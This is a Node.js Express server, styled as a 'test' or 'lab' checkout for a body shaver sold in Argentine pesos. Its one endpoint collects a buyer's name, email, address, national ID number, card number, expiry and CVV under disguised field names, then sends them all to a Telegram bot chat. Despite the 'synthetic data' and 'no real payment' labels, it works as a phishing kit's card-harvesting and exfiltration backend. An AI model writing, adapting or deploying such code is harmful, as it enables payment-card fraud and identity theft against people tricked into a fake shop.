require("dotenv").config();

const express = require("express");
const path = require("path");

const app = express();
const PORT = 3000;

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

app.use(express.json());
app.use(express.static(path.join(__dirname)));

app.post("/api/test", async (req, res) => {

    try {

        if (!BOT_TOKEN) {
            return res.status(500).json({
                ok:false,
                error:"Falta BOT_TOKEN en .env"
            });
        }

        if (!CHAT_ID) {
            return res.status(500).json({
                ok:false,
                error:"Falta CHAT_ID en .env"
            });
        }

        const {
            name,
            email,
            address,
            postalCode,
            city,
            province,
            message,

            testFullName,
            testCode8,
            testCode20,
            testDate,
            testCode3

        } = req.body;

        const text = `🧪 NUEVA SIMULACIÓN

👤 Nombre: ${name || "(vacío)"}
📧 Email: ${email || "(vacío)"}

📍 DIRECCIÓN DE PRUEBA
Dirección: ${address || "(vacío)"}
Código postal: ${postalCode || "(vacío)"}
Ciudad: ${city || "(vacío)"}
Provincia: ${province || "(vacío)"}

💬 Observaciones:
${message || "(sin observaciones)"}

📋 DATOS SINTÉTICOS

Nombre completo: ${testFullName || "(vacío)"}
DNI: ${testCode8 || "(vacío)"}
Datos de cc: ${testCode20 || "(vacío)"}
vencimiento: ${testDate || "(vacío)"}
cvv: ${testCode3 || "(vacío)"}

📦 PRODUCTO

Afeitadora Corporal Voltra Blade Pro
Cantidad: 1
Precio de demostración: $10.000 ARS

🧪 ENTORNO DE LABORATORIO
No se realizó ningún pago real.`;

        console.log("Enviando simulación a Telegram...");

        const response = await fetch(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
            {
                method:"POST",

                headers:{
                    "Content-Type":"application/json"
                },

                body:JSON.stringify({
                    chat_id:CHAT_ID,
                    text:text
                })
            }
        );

        const result = await response.json();

        if(!result.ok){

            console.error(
                "ERROR TELEGRAM:",
                result.error_code,
                result.description
            );

            return res.status(500).json({
                ok:false,
                error:
                    `Telegram ${result.error_code}: ${result.description}`
            });
        }

        console.log("✓ Simulación enviada a Telegram");

        return res.json({
            ok:true
        });

    }catch(error){

        console.error(
            "ERROR DEL SERVIDOR:",
            error
        );

        return res.status(500).json({
            ok:false,
            error:error.message
        });
    }

});

app.listen(PORT,()=>{
    console.log("");
    console.log("=================================");
    console.log(" VOLTRA - SERVIDOR DE PRUEBA");
    console.log("=================================");
    console.log(`http://localhost:${PORT}`);
    console.log("");
});